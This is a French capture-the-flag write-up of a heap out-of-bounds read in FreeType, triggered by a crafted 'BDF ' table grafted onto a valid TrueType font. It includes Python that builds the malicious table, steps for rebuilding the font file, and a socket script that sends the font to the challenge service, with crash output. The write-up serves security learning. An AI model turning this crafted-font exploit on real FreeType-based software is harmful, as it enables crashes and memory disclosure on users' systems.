# VULN#006 — FreeType : OOB read via la table BDF

- **Auteur :** lyons

- **Catégorie :** vuln research
- **Points :** 98
- **Flag :** `CTF{REDACTED}`
- **Service :** `<HOST>:<PORT>` (protocole : préfixe de longueur sur 4 octets big-endian + fichier de police)

## Contexte

Un service d'inspection de polices charge le fichier de font transmis par le client et y
lit une métadonnée. Il repose sur **FreeType**, la bibliothèque open-source de rendu de
polices qu'embarquent Android, iOS (via CoreText), Chrome et quantité d'applications.

**Protocole :** transmettre un préfixe de 4 octets big-endian portant la taille, puis les
octets bruts du fichier de police. Le service répond avec le verdict de l'inspection.

## Analyse

### Bibliothèque visée : FreeType

L'énoncé mentionne « a real, unmodified, widely used open-source font rendering library,
the same engine Android's own system text renderer [...] is built on ». Il s'agit de
FreeType (libfreetype), le moteur de rasterisation de polices le plus déployé au monde.

### Surface d'attaque : table BDF embarquée

Les fichiers TrueType/OpenType forment des conteneurs de tables repérées par des tags
de 4 octets. FreeType reconnaît une table optionnelle `BDF ` (Bitmap Distribution Format)
qui rassemble des propriétés (nom/valeur) destinées aux polices bitmap embarquées.

La vulnérabilité réside dans le parsing des propriétés BDF : dès qu'une propriété de
type « atom » (chaîne) vise un offset proche de la fin du bloc de strings, la fonction
`ft_memchr` (à la recherche du NUL terminal) franchit les bornes du buffer alloué,
d'où un **heap-buffer-overflow read**.

### Construction du fichier piégé

1. **Base :** partir d'un fichier TTF valide (DejaVu Sans Mono) afin de disposer d'une
   structure TrueType correcte (header, table directory, tables essentielles).

2. **Injection de la table BDF :**

   ```
   Header BDF : version=0x0001, num_strikes=1, strings_offset=22
   Strike    : ppem=16, num_items=1
   Entry     : name_offset=0, type=0x10 (atom), value=62
   Strings   : "FOO\x00" + "A"*60
   ```

   Le champ `value` (62) désigne l'avant-dernier octet du bloc de strings. Dès que
   FreeType part en quête du NUL terminal depuis cet offset, il dépasse le buffer
   alloué → OOB read.

3. **Assemblage :** rebâtir le fichier TTF avec l'intégralité des tables originales
   augmentée de la table `BDF `, en recalculant le table directory (offsets, checksums,
   searchRange, entrySelector, rangeShift).

## Méthode

### 1. Génération de la table BDF malveillante

```python
import struct

def build_bdf(pad=60):
    strings = b"FOO\x00" + b"A" * pad
    strings_off, name_off, typ = 22, 0, 0x10
    value = len(strings) - 2
    hdr = struct.pack(">HHI", 0x0001, 1, strings_off)
    strike = struct.pack(">HH", 16, 1)
    entry = struct.pack(">I", name_off) + struct.pack(">H", typ) + struct.pack(">I", value)
    return hdr + strike + entry + strings
```

Le `value` est calibré pour viser 2 octets avant la fin du bloc de strings, ce qui
contraint `ft_memchr` à scruter au-delà des limites.

### 2. Reconstruction du TTF

- Charger une font base valide (ex: DejaVu) et parser son table directory.
- Greffer la table `BDF ` avec le payload.
- Recalculer les checksums (`sum(u32be)` pour chaque table).
- Rebâtir le sfnt header (numTables, searchRange, entrySelector, rangeShift).
- Caler chaque table sur 4 octets (padding NUL).

### 3. Envoi au service

```python
import socket, struct

data = make_font()
msg = struct.pack(">I", len(data)) + data
s = socket.create_connection(("<HOST>", <PORT>), timeout=10)
s.sendall(msg)
response = b""
while True:
    chunk = s.recv(8192)
    if not chunk:
        break
    response += chunk
s.close()
```

### 4. Résultat

```
status: crash confirmed (heap-buffer-overflow in embedded BDF property lookup)
FLAG: CTF{REDACTED}
```

Le service repère le crash (via ASan ou un mécanisme équivalent) puis restitue le flag.

## Flux de la vulnérabilité

```
FT_Open_Face()
  → tt_face_load_bdf_props()
    → ft_property_string_list()
      → ft_memchr(strings + value, '\0', strings_len - value)
```

Lorsque `value ≈ strings_len`, le troisième argument se réduit à très peu (1-2 octets). Si le
NUL fait défaut dans cette fenêtre, `ft_memchr` poursuit sa lecture dans la mémoire
heap adjacente → heap-buffer-overflow read.

## Indicateurs

- Service qui avale des fichiers de police soumis par l'utilisateur.
- Mention de FreeType, HarfBuzz, ou « font rendering library ».
- Protocole binaire à length-prefix (même pattern que VULN#004 et OT#004).

## Leçons

- Les parseurs de formats complexes (fonts, images, documents) forment une surface
  d'attaque bien connue — les tables optionnelles/obsolètes échappent souvent aux tests.
- FreeType a accumulé de nombreuses CVE autour du parsing de tables (BDF, CFF, SFD, PCF).
- La technique « greffer une table malveillante sur un fichier valide » se réutilise
  sur tout format de conteneur à tables (TTF/OTF, RIFF, IFF, etc.).
- Le protocole wire (préfixe de longueur 4-byte BE + octets bruts) revient sans cesse
  sur cette plateforme CTF.

## Flag

```
CTF{REDACTED}
```

---

*Write-up par **lyons** — BUG|PWN CTF · VULN#006.*
